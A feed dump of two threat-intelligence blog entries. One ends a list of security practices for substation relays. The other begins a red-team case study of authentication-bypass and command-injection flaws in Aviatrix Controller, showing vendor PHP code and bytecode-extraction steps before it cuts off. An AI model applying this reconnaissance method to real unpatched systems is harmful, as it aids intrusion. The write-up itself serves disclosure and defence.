</span><span style=\"vertical-align: baseline;\">Top 20 Secure PLC Coding Practices</span><span style=\"vertical-align: baseline;\"> have shaped secure programming conversations for logic-bearing control systems and Mandiant aims for this \"Top 10 Security Practices for Substation Relays\" list to serve a similar purpose for the protection engineering domain.</span></p>\n<h3><span style=\"vertical-align: baseline;\">Top 10 Security Practices for Substation Relays</span></h3></div>\n<div class=\"block-paragraph_advanced\"><div align=\"left\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\"><table border=\"1px\" cellpadding=\"16px\" style=\"border-collapse: collapse; margin-left: auto; margin-right: auto;\"><colgroup><col /><col /><col /><col /></colgroup>\n<tbody>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p style=\"text-align: center;\"><strong style=\"vertical-align: baseline;\">#</strong></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p style=\"text-align: center;\"><strong style=\"vertical-align: baseline;\">Practice</strong></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p style=\"text-align: center;\"><strong style=\"vertical-align: baseline;\">What It Protects</strong></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p style=\"text-align: center;\"><strong style=\"vertical-align: baseline;\">Explanation</strong></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p style=\"text-align: center;\"><span style=\"vertical-align: baseline;\">1</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Authentication &amp; Role Separation</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Prevents unauthorized relay access and privilege misuse</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Ensure each user has their own account with only the permissions they need (e.g., Operator, Engineer). Remove default or unused credentials.</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p style=\"text-align: center;\"><span style=\"vertical-align: baseline;\">2</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Secure Firmware &amp; Configuration Updates</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Prevents unauthorized or malicious software uploads</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Only allow firmware/configuration updates using verified, signed images through secure tools or physical access. Keep update logs.</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p style=\"text-align: center;\"><span style=\"vertical-align: baseline;\">3</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Network &amp; Protocol Hardening</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Prevents spoofed messages, unauthorized remote access, VLAN abuse</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Disable unused services like HTTP, Telnet, or FTP. Use authenticated communication for SCADA protocols (IEC 61850, DNP3). Whitelist IPs.</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p style=\"text-align: center;\"><span style=\"vertical-align: baseline;\">4</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Time Synchronization &amp; Logging Protection</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Ensures forensic accuracy and prevents log tampering or replay attacks</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Use authenticated SNTP or IRIG-B for time. Protect event logs (SER, fault records) from unauthorized deletion or overwrite.</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p style=\"text-align: center;\"><span style=\"vertical-align: baseline;\">5</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Custom Logic Integrity Protection</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Prevents logic-based sabotage or backdoors in protection schemes</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Monitor and restrict changes to programmable logic (trip equations, control rules). Maintain version history and hash verification.</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p style=\"text-align: center;\"><span style=\"vertical-align: baseline;\">6</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Physical Interface Hardening</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Blocks unauthorized access via debug ports or jumpers</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Disable, seal, or password-protect physical interfaces like USB, serial, or Ethernet service ports. Protect access jumpers.</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p style=\"text-align: center;\"><span style=\"vertical-align: baseline;\">7</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Redundancy and Failover Readiness</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Ensures protection continuity during relay failure or communication outage</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Test pilot schemes (POTT, DCB, 87L). Configure redundant paths and relays with identical settings and failover behavior.</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p style=\"text-align: center;\"><span style=\"vertical-align: baseline;\">8</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Remote Access Restrictions &amp; Monitoring</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Prevents dormant vendor backdoors and insecure remote control</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Disable remote services when not needed. Remove unused vendor/service accounts. Alert on all remote access attempts.</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p style=\"text-align: center;\"><span style=\"vertical-align: baseline;\">9</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Command Supervision &amp; Breaker Output Controls</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Prevents unauthorized tripping or closing of breakers</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Add logic constraints (status checks, delays, dual-conditions) to all trip/close outputs. Log all manual commands.</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p style=\"text-align: center;\"><span style=\"vertical-align: baseline;\">10</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Centralized Log Forwarding &amp; SIEM Integration</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Enables detection of attacks and misconfigurations across systems</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Relay logs and alerts should be sent to a central monitoring system (SIEM or historian) for correlation, alerts, and audit trails.</span></p>\n</td>\n</tr>\n</tbody>\n</table></div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div></div>\n<div class=\"block-paragraph_advanced\"><h2><span style=\"vertical-align: baseline;\">Call to Action</span></h2>\n<p><span style=\"vertical-align: baseline;\">In an era of increasing digitization and escalating cyber threats, the integrity of our power infrastructure hinges on the security of its most fundamental guardians: protection relays. The focus of this analysis is to highlight the criticality of enabling existing security controls and incorporating security as a core design principle for every new substation and upgrade. As sophisticated threat actors, including nation-state-sponsored groups from countries like Russia, China and Iran, actively target critical infrastructure, the need to secure these devices has never been more urgent.</span></p>\n<p><span style=\"vertical-align: baseline;\">Mandiant recommends that all asset owners prioritize auditing remote access paths to substation automation systems and investigate the feasibility of implementing the \"Top 10 Security Practices for Substation Relays\" highlighted in this document. Defenders should also consider building a test relay lab or a relay </span><a href=\"https://cloud.google.com/blog/products/identity-security/how-to-build-a-digital-twin-to-boost-resilience\"><span style=\"text-decoration: underline; vertical-align: baseline;\">digital twin</span></a><span style=\"vertical-align: baseline;\">, which are cloud-based replicas of their physical systems offered by some relay vendors, for robust security and resilience testing in a safe environment. By using real-time data, organizations can use test relay labs or digital twins to—among other things—test for essential subsystem interactions and repercussions of their systems transitioning from a secure state to an insecure state, all without disrupting production. </span><strong style=\"vertical-align: baseline;\">To validate these security controls against a realistic adversary, a </strong><a href=\"https://cloud.google.com/blog/topics/threat-intelligence/hands-on-introduction-to-mandiant-approach-to-ot-red-teaming\"><strong style=\"vertical-align: baseline;\">Mandiant OT Red Team exercise</strong></a><strong style=\"vertical-align: baseline;\"> can safely simulate the tactics, techniques, and procedures used in real-world attacks and assess your team's detection and response capabilities. </strong><span style=\"vertical-align: baseline;\">By taking proactive steps to harden these vital components, we can collectively enhance the resilience of the grid against a determined and evolving threat landscape</span>.</p></div>"}
{"source": "Threat Intelligence", "title": "Trix Shots: Remote Code Execution on Aviatrix Controller", "link": "https://cloud.google.com/blog/topics/threat-intelligence/remote-code-execution-aviatrix-controller/", "published": "Mon, 23 Jun 2025 14:00:00 +0000", "summary": "<div class=\"block-paragraph_advanced\"><p>Written by: Louis Dion-Marcil</p>\n<hr /></div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">This blog post highlights a Mandiant Red Team case study simulating an </span><a href=\"https://cloud.google.com/blog/topics/threat-intelligence/red-team-application-security-testing\"><span style=\"text-decoration: underline; vertical-align: baseline;\">“Initial Access Brokerage” approach</span></a><span style=\"vertical-align: baseline;\"> that discovered two vulnerabilities on </span><a href=\"https://aviatrix.com/\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Aviatrix</span></a><span style=\"vertical-align: baseline;\"> Controller, a Software-Defined Networking (SDN) utility that allows for the creation of links between different cloud vendors and regions:</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">CVE-2025-2171: an administrator authentication bypass</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">CVE-2025-2172: an authenticated command injection </span></p>\n</li>\n</ul>\n<p><span style=\"vertical-align: baseline;\">The vulnerabilities affected Aviatrix Controller 7.2.5012 and prior versions and were patched in versions 8.0.0, 7.2.5090, and 7.1.4208. Thank you to the team at Aviatrix who took the reported security issues seriously and remediated them in a timely manner.</span></p>\n<p><span style=\"vertical-align: baseline;\">The Red Team successfully exploited a fully patched Aviatrix Controller via authentication bypass, unsafe file upload, and argument injection. The detailed attack chain is shown in Figure 1.</span></p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"Diagram showing the resulting attack chain\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/aviatrix-fig1.max-1000x1000.png\" />\n        \n        </a>\n      \n        <figcaption class=\"article-image__caption \"><p>Figure 1: Exploitation steps</p></figcaption>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">Earlier this year, Mandiant faced an especially minimal attack surface during a Red Team engagement. Most of the attack surface represented third party SaaS, which were deemed as out of scope for the engagement. One of the interesting services exposed was a fully patched Aviatrix Controller, hosted on AWS. </span></p>\n<p><span style=\"vertical-align: baseline;\">Aviatrix has </span><strong style=\"vertical-align: baseline;\">Gateways</strong><span style=\"vertical-align: baseline;\"> deployed in different clouds and regions, which all phone home to the Aviatrix </span><strong style=\"vertical-align: baseline;\">Controller</strong><span style=\"vertical-align: baseline;\">. Incidentally, compromising the Controller would mean having access to the centralized component which accesses all these cloud gateways and cloud APIs, making it a prime target for attackers. Additionally, we noticed that a recent unauthenticated Command Injection vulnerability had affected Aviatrix Controller in 2024, tracked as CVE-2024-50603. The vulnerability documented in Jakub Korepta’s excellent </span><a href=\"https://www.securing.pl/en/cve-2024-50603-aviatrix-network-controller-command-injection-vulnerability/\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">blog post</span></a><span style=\"vertical-align: baseline;\"> seemed impactful enough to motivate us to look for further vulnerabilities in the Aviatrix Controller. Obtaining Aviatrix Controller source code was relatively easy; we simply followed the steps described in the aforementioned blog post. </span></p>\n<p><span style=\"vertical-align: baseline;\">A goal we identified early on during the engagement was breaching the client’s cloud environment. This could be done via Remote Code Execution, or otherwise bypassing the authentication on the Aviatrix Controller. Unfortunately for us, this proved more difficult than we initially thought.</span></p>\n<h2><span style=\"vertical-align: baseline;\">Architecture</span></h2>\n<p><span style=\"vertical-align: baseline;\">The Aviatrix Controller leverages an interesting architecture. The Controller logic is mostly written in a Python3.10 codebase, bundled in a binary using </span><a href=\"https://pyinstaller.org/en/stable/\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">PyInstaller</span></a><span style=\"vertical-align: baseline;\">. On the Controller server, this executable was found at </span><code style=\"vertical-align: baseline;\">/etc/cloudx/cloudxd</code><span style=\"vertical-align: baseline;\">. </span></p>\n<p><span style=\"vertical-align: baseline;\">The bundled binary was called by an older-looking PHP codebase, which we'll refer to as the \"front-end\". This front-end parsed HTTP requests, extracted parameters, and passed them to the </span><code style=\"vertical-align: baseline;\">cloudxd</code><span style=\"vertical-align: baseline;\"> binary via a </span><code style=\"vertical-align: baseline;\">sudo</code><span style=\"vertical-align: baseline;\"> call, running as </span><code style=\"vertical-align: baseline;\">root</code><span style=\"vertical-align: baseline;\">.</span></p>\n<p><span style=\"vertical-align: baseline;\">For example, when trying to log in on the Aviatrix Controller login page, the browser would issue a request like the following:</span></p></div>\n<div class=\"block-paragraph_advanced\"><div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\"><table border=\"1\" style=\"border-collapse: collapse; width: 99.9641%;\">\n<tbody>\n<tr>\n<td style=\"width: 98.1839%;\">\n<p><code><span style=\"vertical-align: baseline;\">POST /v2/api HTTP/2</span></code><br /><code><span style=\"vertical-align: baseline;\">[...]</span></code></p>\n<code><span style=\"vertical-align: baseline;\">{\"action\":\"login\",\"username\":\"</span><span style=\"vertical-align: baseline; color: #d93025;\">foobar</span><span style=\"vertical-align: baseline;\">\",\"password\":\"</span><span style=\"vertical-align: baseline; color: #d93025;\">foobar</span><span style=\"vertical-align: baseline;\">\"}</span></code></td>\n</tr>\n</tbody>\n</table></div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div></div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">This request would be handled by the </span><code style=\"vertical-align: baseline;\">api.php</code><span style=\"vertical-align: baseline;\"> file found in </span><code style=\"vertical-align: baseline;\">/var/www/</code><span style=\"vertical-align: baseline;\">, which would in turn call the </span><code style=\"vertical-align: baseline;\">verify_login</code><span style=\"vertical-align: baseline;\"> function in </span><code style=\"vertical-align: baseline;\">functions.php</code><span style=\"vertical-align: baseline;\">.</span></p></div>\n<div class=\"block-paragraph_advanced\"><div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\"><table border=\"1\" style=\"border-collapse: collapse; width: 99.9641%;\">\n<tbody>\n<tr>\n<td style=\"width: 98.1839%;\">\n<p><code style=\"vertical-align: baseline;\">  function verify_login($username, $password, $ip, $api = false, $token = '') {</code><br /><code style=\"vertical-align: baseline;\">    $rtn_file = RTN_FILE . rand();</code><br /><code><strong style=\"vertical-align: baseline;\">    <span style=\"color: #d93025;\">$cmdstr = \"sudo \" . CLOUDX_CLI . \" --rtn_file \" . escapeshellarg($rtn_file) . \" user_login_management get_password\";</span></strong></code><br /><code style=\"vertical-align: baseline;\">    $cmdstr .= \" --user_name \" . escapeshellarg($username);</code><br /><code style=\"vertical-align: baseline;\">    $cmdstr .= \" --password \" . escapeshellarg($password);</code><br /><code style=\"vertical-align: baseline;\">    $cmdstr .= \" --login_ip \" . escapeshellarg($ip);</code><br /><code style=\"vertical-align: baseline;\">    if ($api) $cmdstr .= \" --api\";</code><br /><code style=\"vertical-align: baseline;\">    if (!empty($token)) $cmdstr .= \" --api_token \" . escapeshellarg($token);</code><br /><code style=\"vertical-align: baseline;\">    return exec_command($cmdstr, $rtn_file, true);</code><br /><code style=\"vertical-align: baseline;\">  }</code></p>\n</td>\n</tr>\n</tbody>\n</table></div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div></div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">The PHP front-end would call the </span><code style=\"vertical-align: baseline;\">cloudxd</code><span style=\"vertical-align: baseline;\"> binary in the following fashion:</span></p></div>\n<div class=\"block-paragraph_advanced\"><div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\"><table border=\"1\" style=\"border-collapse: collapse; width: 99.9641%;\">\n<tbody>\n<tr>\n<td style=\"width: 98.1839%;\"><code><span style=\"vertical-align: baseline;\">$ sudo </span><code style=\"vertical-align: baseline;\">/etc/cloudx/cloudxd [...] </code><span style=\"color: #d93025;\"><strong style=\"vertical-align: baseline;\">user_login_management</strong><code style=\"vertical-align: baseline;\"> </code><strong style=\"vertical-align: baseline;\">get_password</strong></span><code style=\"vertical-align: baseline;\"> <br />--username </code><strong style=\"vertical-align: baseline;\">foobar</strong><code style=\"vertical-align: baseline;\"> --password </code><strong style=\"vertical-align: baseline;\">foobar </strong><code style=\"vertical-align: baseline;\">--login-ip {user_ip}</code></code></td>\n</tr>\n</tbody>\n</table></div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div></div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">The first argument was the </span><code style=\"vertical-align: baseline;\">\"module\"</code><span style=\"vertical-align: baseline;\">, in this case </span><code><span style=\"color: #d93025;\"><strong style=\"vertical-align: baseline;\">user_login_management</strong></span></code><span style=\"vertical-align: baseline;\">, followed by the </span><code style=\"vertical-align: baseline;\">\"action\"</code><span style=\"vertical-align: baseline;\">, in this case</span><strong style=\"vertical-align: baseline;\"> </strong><code><span style=\"color: #d93025;\"><strong style=\"vertical-align: baseline;\">get_password</strong></span></code><span style=\"vertical-align: baseline;\">. This information will come in handy when trying to hunt for the backend implementation of the </span><code style=\"vertical-align: baseline;\">user_login_management</code><span style=\"vertical-align: baseline;\"> module.</span></p>\n<h2><span style=\"vertical-align: baseline;\">Extracting Back-End Logic</span><strong style=\"vertical-align: baseline;\"> </strong></h2>\n<p><span style=\"vertical-align: baseline;\">The next step was identifying how common authentication flows take place, such as login, user signup, password reset, etc. We started by extracting the compiled Python bytecode found in the </span><code style=\"vertical-align: baseline;\">cloudxd</code><span style=\"vertical-align: baseline;\"> binary, with the help of the </span><a href=\"https://github.com/extremecoders-re/pyinstxtractor\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">pyinstxtractor</span></a><span style=\"vertical-align: baseline;\"> tool. This gave us a clean extract of the Python bytecode, which thankfully was not obfuscated. Identifying the login module was easy, as Aviatrix modules were stored in files of the same name (</span><code><strong style=\"vertical-align: baseline;\">user_login_management</strong></code><span style=\"vertical-align: baseline;\"> would be in </span><code><strong style=\"vertical-align: baseline;\">user_login_management.pyc</strong></code><span style=\"vertical-align: baseline;\">).</span></p></div>\n<div class=\"block-paragraph_advanced\"><div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\"><table border=\"1\" style=\"border-collapse: collapse; width: 99.9641%;\">\n<tbody>\n<tr>\n<td style=\"width: 98.1839%;\">\n<p><code><span style=\"vertical-align: baseline;\">$ find . -name </span><span style=\"color: #d93025;\"><strong style=\"vertical-align: baseline;\">user_login_management.pyc</strong></span></code><br /><code><span style=\"vertical-align: baseline;\">PYZ-00.pyz_extracted/user_login_management.pyc</span></code></p>\n<p><code><span style=\"vertical-align: baseline;\">$ file PYZ-00.pyz_extracted/user_login_management.pyc</span></code><br /><code><span style=\"vertical-align: baseline;\">PYZ-00.pyz_extracted/user_login_management.pyc: Byte-compiled Python module for </span><strong style=\"vertical-align: baseline;\">CPython 3.10</strong><span style=\"vertical-align: baseline;\">, timestamp-based, .py timestamp: Thu Jan  1 00:00:00 1970 UTC, .py size: 0 bytes</span></code></p>\n</td>\n</tr>\n</tbody>\n</table></div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div></div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">The compiled Python file used Python 3.10, which is not supported by most popular Python 